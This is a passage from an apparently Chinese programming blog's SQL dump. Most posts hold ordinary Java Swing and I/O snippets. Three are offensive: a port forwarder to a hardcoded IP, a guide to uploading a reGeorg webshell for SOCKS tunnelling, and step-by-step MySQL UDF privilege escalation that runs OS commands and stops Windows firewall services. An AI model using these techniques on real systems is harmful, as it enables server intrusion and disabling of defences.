}\n}</pre>\n<p><strong>LocalConnector.java</strong></p>\n<pre class=\"brush: java; gutter: true\">import java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.logging.Logger;\npublic class LocalConnector extends Thread {\n	InputStream is;\n	OutputStream os;\n	static final Logger logger = Logger.getLogger(LocalConnector.class.getName());\n	public LocalConnector(InputStream is, OutputStream os) {\n		this.is = is;\n		this.os = os;\n	}\n	public void run() {\n		InputStream in = null;\n		OutputStream out = null;\n		try {\n			in = this.is;\n			out = this.os;\n			byte buffer[] = new byte[8192];\n			int a;\n			while ((a = in.read(buffer)) &gt; 0) {\n				out.write(buffer, 0, a);\n				out.flush();\n			}\n		} catch (Exception e) {\n			e.printStackTrace();\n		}finally{\n			try {\n				if (in != null){\n					in.close();\n				}\n				if (out != null){\n					out.close();\n				}\n			} catch (Exception e) {\n				logger.info(e.toString());\n			}\n		}\n	}\n	public static void main(String[] args) {\n		try {\n			int port = 1080;\n			String forwardHost = &quot;23.244.180.74&quot;;\n			int forwardPort = 1080;\n			ServerSocket ss = new ServerSocket(port);\n			logger.info(&quot;监听端口:&quot;+port);\n			while(true){\n				try {\n					Socket s = ss.accept();\n					String ip = s.getInetAddress().getHostAddress();\n					logger.info(&quot;Host:&quot;+ip+&quot;,连接成功!&quot;);\n					Socket socket = new Socket(forwardHost, forwardPort);\n					logger.info(&quot;转发到:&quot;+forwardHost+&quot;,端口:&quot;+forwardPort);\n					(new LocalConnector(socket.getInputStream(), s.getOutputStream())).start();\n					(new LocalConnector(s.getInputStream(), socket.getOutputStream())).start();\n				} catch (Exception e) {\n					logger.info(e.toString());\n				}\n			}\n		} catch (Exception e) {\n			e.printStackTrace();\n		}\n	}\n}</pre>\n<p><div id=\"xunlei_com_thunder_helper_plugin_d462f475-c18e-46be-bd10-327458d045bd\"></div></p>\n<p><div id=\"xunlei_com_thunder_helper_plugin_d462f475-c18e-46be-bd10-327458d045bd\"></div></p>', null, '2014-08-13 16:04:11', '1', '555', null, '0', '2014-08-13 16:06:53'), ('1424', '5', '12', '[zone]利用webshell搭建socks代理', 'Anonymous', '<p style=\"color: #2f2f2f;\">FROM:http://zone.wooyun.org/content/14470</p>\n<p style=\"color: #2f2f2f;\"><span style=\"font-weight: inherit; font-style: inherit; color: #000000;\">老外的开源应用 </span><br style=\"color: #000000;\" /><br style=\"color: #000000;\" /><a style=\"font-weight: inherit; font-style: inherit; color: #002e8c;\" href=\"https://github.com/sensepost/reGeorg\" target=\"_blank\">https://github.com/sensepost/reGeorg</a><span style=\"font-weight: inherit; font-style: inherit; color: #000000;\"> </span><br style=\"color: #000000;\" /><br style=\"color: #000000;\" /><span style=\"font-weight: inherit; font-style: inherit; color: #000000;\">使用示例： </span><br style=\"color: #000000;\" /><br style=\"color: #000000;\" /><code style=\"font-weight: inherit; font-style: inherit; color: #a0a0a0;\">python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp</code><br style=\"color: #000000;\" /><br style=\"color: #000000;\" /><span style=\"font-weight: inherit; font-style: inherit; color: #000000;\">Step 1. 上传一个脚本(aspx|ashx|jsp|php) 到web服务器上。 </span><br style=\"color: #000000;\" /><br style=\"color: #000000;\" /><span style=\"font-weight: inherit; font-style: inherit; color: #000000;\">Step 2. 执行reGeorgSocksProxy.py脚本，连接shell监听端口。 </span><br style=\"color: #000000;\" /><br style=\"color: #000000;\" /><span style=\"font-weight: inherit; font-style: inherit; color: #000000;\">** 如果你使用nmap等工具需要用到 proxychains。 </span><br style=\"color: #000000;\" /><br style=\"color: #000000;\" /><span style=\"font-weight: inherit; font-style: inherit; color: #000000;\">Step 3. Hack the planet <img class=\"wp-smiley\" src=\"http://javaweb.org/wp-includes/images/smilies/icon_smile.gif\" alt=\":)\" /></span></p>', null, '2014-08-13 23:55:21', '1', '773', null, '1', '2014-12-08 17:17:38'), ('1435', '1', '12', 'SqlMap mysql udf.dll 提权', '园长', '以前分享在百度网盘，好像没人看。直接发文字说明不贴图了哦。\n<p><a style=\"color: #002e8c;\" href=\"http://pan.baidu.com/s/1hqBqULe\" target=\"_blank\">sqlmap lib_mysqludf_sys.zip</a><span style=\"color: #000000;\"> </span></p>\n<p>上传dll文件到任意目录，如：D:/RECYCLER/lib_mysqludf_sys.dll</p>\n<p>导入dll,根据版本导入到windows或mysql 插件目录(一般执行select @@plugin_dir 可看到插件目录具体路径)：</p>\n<p>select load_file(\'D:/RECYCLER/lib_mysqludf_sys.dll\') into dumpfile\'c:/windows/lib_mysqludf_sys.dll\' (高版本需要导入上面查询到的插件目录)</p>\n<p>创建function：</p>\n<p>create function sys_eval returns string soname \'lib_mysqludf_sys.dll\';</p>\n<p>执行命令：</p>\n<p>select sys_eval(\'whoami\');</p>\n<p>一般情况下不会出现创建不成功哦。</p>\n<p>连不上3389可以先停止windows防火墙和筛选</p>\n<p>select sys_eval(\'net stop policyagent\');</p>\n<p>select sys_eval(\'net stop sharedaccess\');</p>', null, '2014-08-15 15:00:19', '1', '831', null, '0', '2014-08-15 15:14:02'), ('1441', '1', '27', 'JTabbedPane 加close的两种方法(jdk1.5和1.6+)', '园长', 'JTabbedPane在1.6的时候新增了setTabComponentAt方法(<a href=\"http://docs.oracle.com/javase/tutorial/uiswing/components/tabbedpane.html\">http://docs.oracle.com/javase/tutorial/uiswing/components/tabbedpane.html</a>)，插入一个关闭按钮很方便，但是jdk1.6以下并不支持。找了两种能够支持关闭按钮的写法，第二种是从<a href=\"http://www.codeproject.com/Articles/18496/JTabbedPane-with-Closing-Tabs\">http://www.codeproject.com/Articles/18496/JTabbedPane-with-Closing-Tabs</a>上拔下来，简单的改了下1.5应该可用。\n<p><p class=\"p1\"><strong>NewJFrame.java</strong></p></p>\n<pre class=\"brush: java; gutter: true\">package org.javaweb.jrat.server.ui;\n/**\n *\n * @author yz\n */\npublic class NewJFrame extends javax.swing.JFrame {\n    public NewJFrame() {\n        initComponents();\n    }\n    private void initComponents() {\n        jPanel1 = new javax.swing.JPanel();\n        jTabbedPane1 = new javax.swing.JTabbedPane();\n        jScrollPane1 = new javax.swing.JScrollPane();\n        jTextArea1 = new javax.swing.JTextArea();\n        jScrollPane2 = new javax.swing.JScrollPane();\n        jTextArea2 = new javax.swing.JTextArea();\n        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);\n        jTextArea1.setColumns(20);\n        jTextArea1.setRows(5);\n        jScrollPane1.setViewportView(jTextArea1);\n        jTabbedPane1.addTab(&quot;tab1&quot;, jScrollPane1);\n        jTextArea2.setColumns(20);\n        jTextArea2.setRows(5);\n        jScrollPane2.setViewportView(jTextArea2);\n        jTabbedPane1.addTab(&quot;tab2&quot;, jScrollPane2);\n        jTabbedPane1.setTabComponentAt((jTabbedPane1.getComponentCount()-1)/2,new ButtonTabComponent(jTabbedPane1));\n        jTabbedPane1.setTabComponentAt((jTabbedPane1.getComponentCount()-1)/2,new ButtonTabComponent(jTabbedPane1));\n        javax.swing.GroupLayout jPanel1Layout = new javax.swing.GroupLayout(jPanel1);\n        jPanel1.setLayout(jPanel1Layout);\n        jPanel1Layout.setHorizontalGroup(\n            jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addComponent(jTabbedPane1, javax.swing.GroupLayout.DEFAULT_SIZE, 400, Short.MAX_VALUE)\n        );\n        jPanel1Layout.setVerticalGroup(\n            jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addComponent(jTabbedPane1, javax.swing.GroupLayout.DEFAULT_SIZE, 300, Short.MAX_VALUE)\n        );\n        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());\n        getContentPane().setLayout(layout);\n        layout.setHorizontalGroup(\n            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addComponent(jPanel1, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)\n        );\n        layout.setVerticalGroup(\n            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addComponent(jPanel1, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)\n        );\n        pack();\n    }// &lt;/editor-fold&gt;                        \n    /**\n     * @param args the command line arguments\n     */\n    public static void main(String args[]) {\n        /* Create and display the form */\n        java.awt.EventQueue.invokeLater(new Runnable() {\n            public void run() {\n                new NewJFrame().setVisible(true);\n            }\n        });\n    }\n    // Variables declaration - do not modify                     \n    private javax.swing.JPanel jPanel1;\n    private javax.swing.JScrollPane jScrollPane1;\n    private javax.swing.JScrollPane jScrollPane2;\n    private javax.swing.JTabbedPane jTabbedPane1;\n    private javax.swing.JTextArea jTextArea1;\n    private javax.swing.JTextArea jTextArea2;\n    // End of variables declaration                   \n}</pre>\n<p><p class=\"p1\"><strong>TabbedPanel.java</strong></p></p>\n<pre class=\"brush: java; gutter: true\">import java.awt.BasicStroke;\nimport java.awt.Color;\nimport java.awt.Component;\nimport java.awt.Dimension;\nimport java.awt.FlowLayout;\nimport java.awt.Graphics;\nimport java.awt.Graphics2D;\nimport java.awt.event.ActionEvent;\nimport java.awt.event.ActionListener;\nimport java.awt.event.MouseAdapter;\nimport java.awt.event.MouseEvent;\nimport javax.swing.AbstractButton;\nimport javax.swing.BorderFactory;\nimport javax.swing.JButton;\nimport javax.swing.JLabel;\nimport javax.swing.JPanel;\nimport javax.swing.JTabbedPane;\nimport javax.swing.plaf.basic.BasicButtonUI;\n/**\n * 可关闭的JTabbedPane标签\n *\n * @author monitor Created on 2011-2-25, 23:52:41\n */\npublic class TabbedPanel extends JPanel {\n    private final JTabbedPane pane;\n    public TabbedPanel(final JTabbedPane pane) {\n        super(new FlowLayout(FlowLayout.LEFT, 0, 0));\n        if (pane == null) {\n            throw new NullPointerException(&quot;TabbedPane is null&quot;);\n        }\n        this.pane = pane;\n        setOpaque(false);\n        //tab标题\n        JLabel label = new JLabel() {\n            @Override\n            public String getText() {\n                int i = pane.indexOfTabComponent(TabbedPanel.this);\n                if (i != -1) {\n                    return pane.getTitleAt(i);\n                }\n                return null;\n            }\n        };\n        add(label);\n        label.setBorder(BorderFactory.createEmptyBorder(0, 0, 0, 2));\n        add(new TabButton());\n        setBorder(BorderFactory.createEmptyBorder(1, 0, 0, 0));\n    }\n    /**\n     * tab上的关闭按钮\n     */\n    private class TabButton extends JButton {\n        public TabButton() {\n            int size = 17;\n            setPreferredSize(new Dimension(size, size));\n            setToolTipText(&quot;关闭&quot;);\n            setUI(new BasicButtonUI());\n            setContentAreaFilled(false);\n            setFocusable(false);\n            setBorder(BorderFactory.createEtchedBorder());\n            setBorderPainted(false);\n            //翻转效果\n            setRolloverEnabled(true);\n            //鼠标事件，进入时画边框，移出时取消边框\n//            addMouseListener(new MouseAdapter() {\n//                @Override\n//                public void mouseEntered(MouseEvent e) {\n//                    Component component = e.getComponent();\n//                    if (component instanceof AbstractButton) {\n//                        AbstractButton button = (AbstractButton) component;\n//                        button.setBorderPainted(true);\n//                    }\n//                }\n//\n//                @Override\n//                public void mouseExited(MouseEvent e) {\n//                    Component component = e.getComponent();\n//                    if (component instanceof AbstractButton) {\n//                        AbstractButton button = (AbstractButton) component;\n//                        button.setBorderPainted(false);\n//                    }\n//                }\n//            });\n            //单击关闭按钮事件\n            addActionListener(new ActionListener() {\n                public void actionPerformed(ActionEvent evt) {\n                    int i = pane.indexOfTabComponent(TabbedPanel.this);\n                    if (i != -1) {\n                        pane.remove(i);\n                    }\n                }\n            });\n        }\n        @Override\n        public void updateUI() {\n        }\n        @Override\n        protected void paintComponent(Graphics g) {\n            super.paintComponent(g);\n            Graphics2D g2 = (Graphics2D) g.create();\n            //鼠标按下时偏移一个坐标点\n            if (getModel().isPressed()) {\n                g2.translate(1, 1);\n            }\n            g2.setStroke(new BasicStroke(2));\n            g2.setColor(Color.BLACK);\n            //鼠标在按钮上时为红色\n//            if (getModel().isRollover()) {\n//                g2.setColor(Color.RED);\n//            }\n            int delta = 6;\n            g2.drawLine(delta, delta, getWidth() - delta - 1, getHeight() - delta - 1);\n            g2.drawLine(getWidth() - delta - 1, delta, delta, getHeight() - delta - 1);\n            g2.dispose();\n        }\n    }\n}</pre>\n<p><p class=\"p1\"><strong>ClosableTabbedPane.java</strong></p></p>\n<pre class=\"brush: java; gutter: true\">import java.awt.BasicStroke;\nimport java.awt.Color;\nimport java.awt.Component;\nimport java.awt.Cursor;\nimport java.awt.Graphics;\nimport java.awt.Graphics2D;\nimport java.awt.Rectangle;\nimport java.awt.event.MouseEvent;\nimport java.awt.event.MouseListener;\nimport java.awt.event.MouseMotionListener;\nimport javax.swing.*;\n/**\n * 创建一个可关闭的TabbedPane\n * @author yz\n *\n */\npublic class ClosableTabbedPane extends JTabbedPane{\n	private static final long serialVersionUID = 1L;\n	private TabCloseUI closeUI = new TabCloseUI(this);\n	public void paint(Graphics g){\n		super.paint(g);\n		closeUI.paint(g);\n	}\n	/**\n	 * 避免TAB标题和close挤在一起，留2个空格位置\n	 */\n	public void addTab(String title, Component component) {\n		super.addTab(title+&quot;  &quot;, component);\n	}\n	public String getTabTitleAt(int index) {\n		return super.getTitleAt(index).trim();\n	}\n	private class TabCloseUI implements MouseListener, MouseMotionListener {\n		private ClosableTabbedPane  tabbedPane;\n		private int closeX = 0 ,closeY = 0, meX = 0, meY = 0;\n		private int selectedTab;\n		private final int  width = 6, height = 6;\n		private Rectangle rectangle = new Rectangle(0,0,width, height);\n		public TabCloseUI(ClosableTabbedPane pane) {\n			tabbedPane = pane;\n			tabbedPane.addMouseMotionListener(this);\n			tabbedPane.addMouseListener(this);\n		}\n		public void mouseEntered(MouseEvent me) {}\n		public void mouseExited(MouseEvent me) {}\n		public void mousePressed(MouseEvent me) {}\n		public void mouseClicked(MouseEvent me) {}\n		public void mouseDragged(MouseEvent me) {}\n		public void mouseReleased(MouseEvent me) {\n			if(closeUnderMouse(me.getX(), me.getY())){\n				boolean isToCloseTab = tabAboutToClose(selectedTab);\n				if (isToCloseTab &amp;&amp; selectedTab &gt; -1){			\n					tabbedPane.removeTabAt(selectedTab);\n				}\n				selectedTab = tabbedPane.getSelectedIndex();\n			}\n		}\n		public void mouseMoved(MouseEvent me) {	\n			meX = me.getX();\n			meY = me.getY();			\n			if(mouseOverTab(meX, meY)){\n				controlCursor();\n				tabbedPane.repaint();\n			}\n		}\n		private void controlCursor() {\n			if(tabbedPane.getTabCount()&gt;0){\n				if(closeUnderMouse(meX, meY)){\n					tabbedPane.setCursor(new Cursor(Cursor.HAND_CURSOR));	\n					if(selectedTab &gt; -1){\n						tabbedPane.setToolTipTextAt(selectedTab, &quot;Close &quot; +tabbedPane.getTitleAt(selectedTab));\n					}\n				}\n				else{\n					tabbedPane.setCursor(new Cursor(Cursor.DEFAULT_CURSOR));\n					if(selectedTab &gt; -1){\n						tabbedPane.setToolTipTextAt(selectedTab,&quot;&quot;);\n					}\n				}\n			}\n		}\n		private boolean closeUnderMouse(int x, int y) {		\n			rectangle.x = closeX;\n			rectangle.y = closeY;\n			return rectangle.contains(x,y);\n		}\n		public void paint(Graphics g) {\n			int tabCount = tabbedPane.getTabCount();\n			for(int j = 0; j &lt; tabCount; j++)\n				if(tabbedPane.getComponent(j).isShowing()){			\n					int x = tabbedPane.getBoundsAt(j).x + tabbedPane.getBoundsAt(j).width -width-5;\n					int y = tabbedPane.getBoundsAt(j).y +5;	\n					drawClose(g,x,y);\n					break;\n				}\n			if(mouseOverTab(meX, meY)){\n				drawClose(g,closeX,closeY);\n			}\n		}\n		private void drawClose(Graphics g, int x, int y) {\n			if(tabbedPane != null &amp;&amp; tabbedPane.getTabCount() &gt; 0){\n				Graphics2D g2 = (Graphics2D)g;				\n				//鼠标悬停的时候切换颜色\n				drawColored(g2, isUnderMouse(x,y)? Color.RED : Color.BLACK, x, y);\n			}\n		}\n		private void drawColored(Graphics2D g2, Color color, int x, int y) {\n			g2.setColor(color);\n			//设置画笔大小2个像素\n			g2.setStroke(new BasicStroke(2));\n			g2.drawLine(x, y, x + width, y + height);\n			g2.drawLine(x + width, y, x, y + height);\n		}\n		private boolean isUnderMouse(int x, int y) {\n			return Math.abs(x-meX)&lt;width &amp;&amp; Math.abs(y-meY)&lt;height;\n		}\n		private boolean mouseOverTab(int x, int y) {\n			int tabCount = tabbedPane.getTabCount();\n			for(int j = 0; j &lt; tabCount; j++){\n				if(tabbedPane.getBoundsAt(j).contains(meX, meY)){\n					selectedTab = j;\n					closeX = tabbedPane.getBoundsAt(j).x + tabbedPane.getBoundsAt(j).width -width-5;\n					closeY = tabbedPane.getBoundsAt(j).y +5;					\n					return true;\n				}\n			}\n			return false;\n		}\n	}\n	public boolean tabAboutToClose(int tabIndex) {\n		return true;\n	}\n}</pre>\n<p><p class=\"p1\"><span class=\"s1\">ClosableTabbedPane</span>调用也很简单，直接new ClosableTabbedPane就行了。</p></p>\n<pre class=\"brush: java; gutter: true\">ClosableTabbedPane tabbedPane = new ClosableTabbedPane() {\n			/**\n			 * 关闭提示框，不用可以删掉\n			 */\n			public boolean tabAboutToClose(int tabIndex) {\n				String tab = tabbedPane.getTabTitleAt(tabIndex);\n				int choice = JOptionPane.showConfirmDialog(null,\n						&quot;You are about to close &#039;&quot; + tab\n								+ &quot;&#039;\\nDo you want to proceed ?&quot;,\n						&quot;Confirmation Dialog&quot;, JOptionPane.INFORMATION_MESSAGE);\n				return choice == 0; // if returned false tab closing will be\n									// canceled\n			}\n		};</pre>\n<pre class=\"brush: java; gutter: true\">&lt;strong&gt;ButtonTabComponent.java:&lt;/strong&gt;</pre>\n<pre class=\"brush: java; gutter: true\">/*\n * To change this license header, choose License Headers in Project Properties.\n * To change this template file, choose Tools | Templates\n * and open the template in the editor.\n */\npackage org.javaweb.jrat.server.ui;\nimport javax.swing.*;\nimport javax.swing.plaf.basic.BasicButtonUI;\nimport java.awt.*;\nimport java.awt.event.*;\n/**\n * Component to be used as tabComponent; Contains a JLabel to show the text and\n * a JButton to close the tab it belongs to\n */\npublic class ButtonTabComponent extends JPanel {\n    private final JTabbedPane pane;\n    public ButtonTabComponent(final JTabbedPane pane) {\n        //unset default FlowLayout&#039; gaps\n        super(new FlowLayout(FlowLayout.LEFT, 0, 0));\n        if (pane == null) {\n            throw new NullPointerException(&quot;TabbedPane is null&quot;);\n        }\n        this.pane = pane;\n        setOpaque(false);\n        //make JLabel read titles from JTabbedPane\n        JLabel label = new JLabel() {\n            public String getText() {\n                int i = pane.indexOfTabComponent(ButtonTabComponent.this);\n                if (i != -1) {\n                    return pane.getTitleAt(i);\n                }\n                return null;\n            }\n        };\n        add(label);\n        //add more space between the label and the button\n        label.setBorder(BorderFactory.createEmptyBorder(0, 0, 0, 5));\n        //tab button\n        JButton button = new TabButton();\n        add(button);\n        //add more space to the top of the component\n        setBorder(BorderFactory.createEmptyBorder(2, 0, 0, 0));\n    }\n    private class TabButton extends JButton implements ActionListener {\n        public TabButton() {\n            int size = 17;\n            setPreferredSize(new Dimension(size, size));\n            setToolTipText(&quot;close this tab&quot;);\n            //Make the button looks the same for all Laf&#039;s\n            setUI(new BasicButtonUI());\n            //Make it transparent\n            setContentAreaFilled(false);\n            //No need to be focusable\n            setFocusable(false);\n            setBorder(BorderFactory.createEtchedBorder());\n            setBorderPainted(false);\n            //Making nice rollover effect\n            //we use the same listener for all buttons\n            addMouseListener(buttonMouseListener);\n            setRolloverEnabled(true);\n            //Close the proper tab by clicking the button\n            addActionListener(this);\n        }\n        public void actionPerformed(ActionEvent e) {\n            int i = pane.indexOfTabComponent(ButtonTabComponent.this);\n            if (i != -1) {\n                pane.remove(i);\n            }\n        }\n        //we don&#039;t want to update UI for this button\n        public void updateUI() {\n        }\n        //paint the cross\n        protected void paintComponent(Graphics g) {\n            super.paintComponent(g);\n            Graphics2D g2 = (Graphics2D) g.create();\n            //shift the image for pressed buttons\n            if (getModel().isPressed()) {\n                g2.translate(1, 1);\n            }\n            g2.setStroke(new BasicStroke(2));\n            g2.setColor(Color.BLACK);\n            if (getModel().isRollover()) {\n                g2.setColor(Color.MAGENTA);\n            }\n            int delta = 6;\n            g2.drawLine(delta, delta, getWidth() - delta - 1, getHeight() - delta - 1);\n            g2.drawLine(getWidth() - delta - 1, delta, delta, getHeight() - delta - 1);\n            g2.dispose();\n        }\n    }\n    private final static MouseListener buttonMouseListener = new MouseAdapter() {\n        public void mouseEntered(MouseEvent e) {\n            Component component = e.getComponent();\n            if (component instanceof AbstractButton) {\n                AbstractButton button = (AbstractButton) component;\n                button.setBorderPainted(true);\n            }\n        }\n        public void mouseExited(MouseEvent e) {\n            Component component = e.getComponent();\n            if (component instanceof AbstractButton) {\n                AbstractButton button = (AbstractButton) component;\n                button.setBorderPainted(false);\n            }\n        }\n    };\n}</pre>', null, '2014-08-25 14:41:02', '1', '691', null, '0', '2014-08-25 15:12:27'), ('1448', '1', '3', 'ReadLine', '园长', '<pre class=\"brush: java; gutter: true\">public int readLine(InputStream fis) throws IOException {\n		int count = 0, c;\n		int len = fis.available();\n		int off = 0;\n		byte[] b = new byte[len];\n		while ((c = fis.read()) != -1) {\n			b[off++] = (byte) c;\n			count++;\n			if (c == 0x10  || count == len) {\n				break;\n			}\n		}\n		System.out.println(new String(b,0,count-1));\n		for (int i = 0; i &lt; count-1; i++) {\n			System.out.println(b[i]);\n		}\n		return count &gt; 0 ? count : -1;\n	}</pre>\n<pre class=\"brush: java; gutter: true\">/**\n     * Reads a line of text.  A line is considered to be terminated by any one\n     * of a line feed (&#039;\\n&#039;), a carriage return (&#039;\\r&#039;), or a carriage return\n     * followed immediately by a linefeed.\n     *\n     * @param      ignoreLF  If true, the next &#039;\\n&#039; will be skipped\n     *\n     * @return     A String containing the contents of the line, not including\n     *             any line-termination characters, or null if the end of the\n     *             stream has been reached\n     *\n     * @see        java.io.LineNumberReader#readLine()\n     *\n     * @exception  IOException  If an I/O error occurs\n     */\n    String readLine(boolean ignoreLF) throws IOException {\n        StringBuffer s = null;\n        int startChar;\n        synchronized (lock) {\n            ensureOpen();\n            boolean omitLF = ignoreLF || skipLF;\n        bufferLoop:\n            for (;;) {\n                if (nextChar &gt;= nChars)\n                    fill();\n                if (nextChar &gt;= nChars) { /* EOF */\n                    if (s != null &amp;&amp; s.length() &gt; 0)\n                        return s.toString();\n                    else\n                        return null;\n                }\n                boolean eol = false;\n                char c = 0;\n                int i;\n                /* Skip a leftover &#039;\\n&#039;, if necessary */\n                if (omitLF &amp;&amp; (cb[nextChar] == &#039;\\n&#039;))\n                    nextChar++;\n                skipLF = false;\n                omitLF = false;\n            charLoop:\n                for (i = nextChar; i &lt; nChars; i++) {\n                    c = cb[i];\n                    if ((c == &#039;\\n&#039;) || (c == &#039;\\r&#039;)) {\n                        eol = true;\n                        break charLoop;\n                    }\n                }\n                startChar = nextChar;\n                nextChar = i;\n                if (eol) {\n                    String str;\n                    if (s == null) {\n                        str = new String(cb, startChar, i - startChar);\n                    } else {\n                        s.append(cb, startChar, i - startChar);\n                        str = s.toString();\n                    }\n                    nextChar++;\n                    if (c == &#039;\\r&#039;) {\n                        skipLF = true;\n                    }\n                    return str;\n                }\n                if (s == null)\n                    s = new StringBuffer(defaultExpectedLineLength);\n                s.append(cb, startChar, i - startChar);\n            }\n        }\n    }</pre>\n<pre class=\"brush: java; gutter: true\">bufferLoop java label写法</pre>', null, '2014-08-26 12:20:50', '1', '547', null, '0', '2014-08-26 12:20:50'), ('1450', '1', '3', '不需解压修改jar包文件内容', '园长', '修改jar内容，一般做法是先解压再修改最好再压缩成jar。看了下api发现可以直接通过修改InputStream内容去修改jar。\n<p>代码：</p>\n<pre class=\"brush: java; gutter: true\">/**\n	 * 修改jar包内容\n	 * @param jarPath\n	 * @param path\n	 * @throws Exception \n	 */\n	public static void makeJar(String jarPath,String path) throws Exception {\n		try {\n			JarOutputStream jos = new JarOutputStream(new FileOutputStream(path));\n			File jarFile = new File(jarPath);\n			JarFile jf = new JarFile(jarFile);\n			Enumeration&lt;JarEntry&gt; je = jf.entries();\n			while (je.hasMoreElements()) {\n				JarEntry jar = je.nextElement();\n				System.out.println(jar.getName());\n				ZipEntry z = new ZipEntry(jar.getName());\n				InputStream in = jf.getInputStream(jar);\n				jos.putNextEntry(z);\n				//修改config.properties文件中的host位hehe\n				if(&quot;config.properties&quot;.equals(jar.getName())){\n					jos.write(IOUtils.toString(in,&quot;UTF-8&quot;).replace(&quot;host&quot;, &quot;hehe&quot;).getBytes(&quot;UTF-8&quot;));\n				}else{\n					jos.write(IOUtils.toByteArray(in));\n				}\n				jos.closeEntry();\n			}\n			jos.close();\n			jf.close();\n		} catch (Exception e) {\n			throw e;\n		}\n	}\n	public static void main(String[] args) {\n		try {\n			makeJar(&quot;/Users/yz/fat.jar&quot;,&quot;/Users/yz/1.jar&quot;);\n		} catch (Exception e) {\n			e.printStackTrace();\n		}\n	}</pre>\n<p>反编译修改后的jar发现原来的jar包当中的config.properties已经修改成功了。</p>', null, '2014-08-28 18:11:58', '1', '585', null, '2', '2014-08-28 18:11:58');
INSERT INTO `sys_posts` VALUES ('1452', '1', '3', 'Filter (seach and replace) array of bytes in an InputStream', '园长', '<p class=\"p1\">byte[] byte替换，From：<a class=\"question-hyperlink\" style=\"color: #000000;\" href=\"http://stackoverflow.com/questions/7743534/filter-seach-and-replace-array-of-bytes-in-an-inputstream\">Filter (seach and replace) array of bytes in an InputStream</a></p>\n<p><p class=\"p1\"><strong>ReplacingInputStream.java</strong></p></p>\n<pre class=\"brush: java; gutter: true\">import java.io.*;\nimport java.util.*;\nclass ReplacingInputStream extends FilterInputStream {\n	LinkedList&lt;Integer&gt; inQueue = new LinkedList&lt;Integer&gt;();\n	LinkedList&lt;Integer&gt; outQueue = new LinkedList&lt;Integer&gt;();\n	final byte[] search, replacement;\n	protected ReplacingInputStream(InputStream in, byte[] search,byte[] replacement) {\n		super(in);\n		this.search = search;\n		this.replacement = replacement;\n	}\n	private boolean isMatchFound() {\n		Iterator&lt;Integer&gt; inIter = inQueue.iterator();\n		for (int i = 0; i &lt; search.length; i++) {\n			if (!inIter.hasNext() || search[i] != inIter.next()) {\n				return false;\n			}\n		}\n		return true;\n	}\n	private void readAhead() throws IOException {\n		// Work up some look-ahead.\n		while (inQueue.size() &lt; search.length) {\n			int next = super.read();\n			inQueue.offer(next);\n			if (next == -1) {\n				break;\n			}\n		}\n	}\n	public int read() throws IOException {\n		// Next byte already determined.\n		if (outQueue.isEmpty()) {\n			readAhead();\n			if (isMatchFound()) {\n				for (int i = 0; i &lt; search.length; i++) {\n					inQueue.remove();\n				}\n				for (byte b : replacement) {\n					outQueue.offer((int) b);\n				}\n			} else{\n				outQueue.add(inQueue.remove());\n			}\n		}\n		return outQueue.remove();\n	}\n}</pre>\n<p><strong>Test.java</strong></p>\n<pre class=\"brush: java; gutter: true\">import java.io.ByteArrayInputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.InputStream;\nclass Test {\n	public static void main(String[] args) throws Exception {\n		byte[] bytes = &quot;hello xyz aa xyz world.&quot;.getBytes(&quot;UTF-8&quot;);\n		ByteArrayInputStream bis = new ByteArrayInputStream(bytes);\n		byte[] search = &quot;xyz&quot;.getBytes(&quot;UTF-8&quot;);\n		byte[] replacement = &quot;abc&quot;.getBytes(&quot;UTF-8&quot;);\n		InputStream ris = new ReplacingInputStream(bis, search, replacement);\n		ByteArrayOutputStream bos = new ByteArrayOutputStream();\n		int b;\n		while (-1 != (b = ris.read())) {\n			bos.write(b);\n		}\n		System.out.println(new String(bos.toByteArray()));\n	}\n}</pre>', null, '2014-08-28 23:02:29', '1', '544', null, '0', '2014-08-28 23:02:29'), ('1454', '1', '27', 'Swing JTable 动态SQL语句查询', '园长', '写了无数次了，保存起来下次不重写了。每执行一次查询更新一次table的表头和表行数据。\n<pre class=\"brush: java; gutter: true\">private void jButton1ActionPerformed(java.awt.event.ActionEvent evt) {// GEN-FIRST:event_jButton1ActionPerformed\n		ResultSet rs = DBUtil.executeQuery(textField1.getText());//执行SQL语句\n		// jTable1 = new JTable();\n		try {\n			List&lt;List&lt;Object&gt;&gt; ls = new ArrayList&lt;List&lt;Object&gt;&gt;();\n			List&lt;String&gt; column = new ArrayList&lt;String&gt;();\n			ResultSetMetaData rsm = rs.getMetaData();//获取表元数据\n			for (int i = 1; i &lt; rsm.getColumnCount()+1; i++) {\n				column.add(rsm.getColumnName(i));\n			}\n			while (rs.next()) {\n				List&lt;Object&gt; result = new ArrayList&lt;Object&gt;();\n				for (int i = 1; i &lt; rsm.getColumnCount()+1; i++) {\n					result.add(rs.getObject(i));\n				}\n				ls.add(result);\n			}\n			Object[][] obj = new Object[ls.size()][column.size()];\n			for (int i = 0; i &lt; ls.size(); i++) {\n				List&lt;Object&gt; a = ls.get(i);\n				for (int j = 0; j &lt; column.size(); j++) {\n					System.out.println(a.get(j));\n					obj[i][j] = a.get(j);\n				}\n			}\n			jTable1.setModel(new DefaultTableModel(obj,column.toArray(new String[column.size()])));\n		} catch (Exception e) {\n			e.printStackTrace();\n		}\n	}</pre>', null, '2014-08-31 17:34:33', '1', '695', null, '0', '2014-08-31 17:34:33'), ('1459', '1', '10', 'asp.net SqlHelp.cs 和 SQL预编译', '园长', 'SQL预编译：\n<pre class=\"brush: actionscript3; gutter: true\">string sql = &quot;select count(1) from xxx where xxx = @id &quot;;\nSqlParameter[] paras = new SqlParameter[] { \n      new SqlParameter(&quot;@id&quot;, id)\n};\nsqlHelp.executeQueryScalar(sql, paras);</pre>\n<p>简单封装了一下</p>\n<pre class=\"brush: csharp; gutter: true\">using System;\nusing 